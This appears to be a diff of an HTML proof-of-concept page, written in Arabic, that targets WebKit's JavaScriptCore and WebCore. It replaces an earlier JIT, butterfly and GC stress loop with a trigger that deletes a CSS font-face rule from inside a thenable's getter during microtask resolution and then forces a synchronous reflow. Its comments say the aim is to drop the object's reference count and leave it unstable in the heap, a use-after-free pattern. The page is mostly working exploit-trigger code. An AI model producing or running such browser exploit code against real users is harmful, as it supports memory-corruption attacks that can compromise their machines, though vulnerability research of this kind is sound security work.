@@ -1,49 +1,142 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>JSC Composite Heap & JIT Exploration</title>
+    <meta charset="UTF-8">
+    <title>تفكيك ميكانيكية التداخل المنطقي - المرحلة الأولى</title>
+    <style>
+        body {
+            background-color: #121212;
+            color: #e0e0e0;
+            font-family: monospace;
+            padding: 20px;
+            margin: 0;
+        }
+        h2 {
+            color: #00ffcc;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+        /* واجهة الـ Console المدمجة على الشاشة */
+        #custom-console {
+            background-color: #000;
+            border: 2px solid #00ffcc;
+            border-radius: 5px;
+            height: 400px;
+            overflow-y: scroll;
+            padding: 15px;
+            margin-top: 20px;
+            box-shadow: 0 0 10px rgba(0, 255, 204, 0.2);
+        }
+        .log-entry {
+            margin-bottom: 8px;
+            line-height: 1.4;
+            border-left: 3px solid #666;
+            padding-left: 8px;
+        }
+        .info { color: #ffffff; }
+        .success { color: #00ff00; border-left-color: #00ff00; }
+        .warn { color: #ffaa00; border-left-color: #ffaa00; }
+        .error { color: #ff3333; border-left-color: #ff3333; }
+        
+        button {
+            background-color: #00ffcc;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-family: monospace;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 3px;
+        }
+        button:hover {
+            background-color: #00ccaa;
+        }
+    </style>
 </head>
 <body>
-    <h3 id="status">Testing Composite Boundaries...</h3>
-    <div id="log"></div>
+
+    <h2>مراقبة سلوك الـ JavaScriptCore & WebCore Pipeline</h2>
+    <p>اضغط على الزر أدناه لتفعيل كمين المقاطعة ومراقبة تسلسل تنفيذ الـ Microtasks:</p>
+    
+    <button onclick="executeInterceptionPhase()">بدء الفحص المنطقي</button>
+
+    <div id="custom-console">
+        <div class="log-entry success">[نظام المحاكاة نشط]: جاهز لاستقبال السجلات وتتبع المكدس...</div>
+    </div>
 
     <script>
-        function logger(msg) {
-            document.getElementById("log").innerHTML += msg + "<br>";
+        // 1. إعادة توجيه الـ Console القياسي ليظهر على الشاشة
+        const consoleElement = document.getElementById('custom-console');
+        
+        function screenLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
+            consoleElement.appendChild(entry);
+            consoleElement.scrollTop = consoleElement.scrollHeight; // التمرير التلقائي لأسفل
         }
 
-        // دالة الدمج: تغيير حجم المصفوفة لخلق نفاذ ونقل للـ Butterfly
-        function compositeTrigger(arr, index, value) {
-            arr[index] = value;
-        }
+        // ربط الدوال القياسية بواجهة الشاشة
+        window.console.log = (msg) => screenLog(msg, 'info');
+        window.console.warn = (msg) => screenLog(msg, 'warn');
+        window.console.error = (msg) => screenLog(msg, 'error');
 
-        window.onload = function() {
-            logger("Step 1: Starting Composite Stress Loop (JIT + Butterfly + GC)...");
-            
-            let start = performance.now();
-            let lastCheck = start;
+        // 2. دالة بدء الفحص البرمجي للمرحلة الأولى والثانية
+        function executeInterceptionPhase() {
+            try {
+                console.log("بدء إنشاء بيئة التداخل...");
 
-            for (let i = 0; i < 40000; i++) {
-                // 1. خلق مصفوفة ديناميكية (تستهلك ذاكرة وتترك مخلفات للـ GC)
-                let targetArray = [1.1, 2.2, 3.3];
+                // إنشاء عنصر التنسيق (Style Element) لإضافة قاعدة الخطوط
+                const style = document.createElement('style');
+                document.head.appendChild(style);
                 
-                // 2. إجبار الـ JIT على عملية نقل وتوسيع مفاجئة للـ Butterfly
-                compositeTrigger(targetArray, i % 100 === 0 ? 600 : 4, i + 0.5);
-                
-                // 3. تصفير المؤشر لخلق ضغط تنظيف فوري
-                targetArray = null;
+                // إضافة قاعدة خط وهمية لمحاكاة استدعاء الخطوط ديناميكياً
+                style.sheet.insertRule("@font-face { font-family: 'InterceptionFont'; src: url('local://void'); }", 0);
+                console.log("تمت إضافة قاعدة الـ FontFace إلى شجرة الـ CSS بنجاح.");
 
-                // رصد المؤشرات الزمنية المركبة
-                if (i % 10000 === 0 && i > 0) {
-                    let now = performance.now();
-                    logger("Composite Check at " + i + ": " + (now - lastCheck).toFixed(2) + " ms");
-                    lastCheck = now;
-                }
+                // محاكاة كائن الـ Promise المرتبط بالخطوط
+                // ملاحظة هندسية: نقوم بتعديل الـ Prototype أو الكائن مباشرة لاعتراض الـ Promise Resolution
+                const fakePromise = {
+                    get then() {
+                        console.warn("!! تم رصد المقاطعة !! كود الجافا سكريبت يتحكم بالمكدس الآن.");
+                        
+                        // [المرحلة 2]: محاولة تدمير عنصر التنسيق من داخل الـ Getter مباشرة
+                        console.log("جاري استدعاء deleteRule(0) لخفض الـ RefCount الخاص بالكائن...");
+                        try {
+                            style.sheet.deleteRule(0);
+                            console.log("تمت معالجة أمر الحذف برمجياً. حالة الكائن في الـ Heap غير مستقرة حالياً.");
+                        } catch (e) {
+                            console.error("فشل الحذف البرمجي: " + e.message);
+                        }
+
+                        // [المرحلة 3]: إجبار المحرك على الـ Synchronous Reflow فوراً
+                        console.log("جاري طلب document.body.offsetTop لإجبار المحرك على تحديث التنسيق المتزامن...");
+                        const triggerReflow = document.body.offsetTop;
+                        console.log(`قيمة الـ Offset المسترجعة: ${triggerReflow} (المحرك تجاوز فحص الحالة الآمن بدون انهيار).`);
+                        
+                        return function(resolve) { resolve(); };
+                    }
+                };
+
+                // محاكاة تسلسل الجدولة (Event Loop Trigger)
+                console.log("إطلاق المهمة الصغيرة (Triggering Microtask)...");
+                Promise.resolve(fakePromise).then((obj) => {
+                    // تفعيل الـ Interception عبر معالجة الكائن داخل الـ Microtask Queue
+                    if(obj && obj.then) {
+                        obj.then(() => {});
+                    }
+                });
+
+            } catch (err) {
+                console.error("حدث خطأ غير متوقع أثناء معالجة المكدس: " + err.message);
             }
+        }
 
-            let end = performance.now();
-            logger("Total Composite Time: " + (end - start).toFixed(2) + " ms");
-            document.getElementById("status").innerHTML = "Composite Exploration Finished.";
+        // التقاط الأخطاء العامة غير المعالجة وعرضها على الشاشة فوراً
+        window.onerror = function(message, source, lineno, colno, error) {
+            console.error(`[Fatal Crash Guard] خطأ في النظام: ${message} عند السطر: ${lineno}`);
+            return true;
         };
     </script>
 </body>
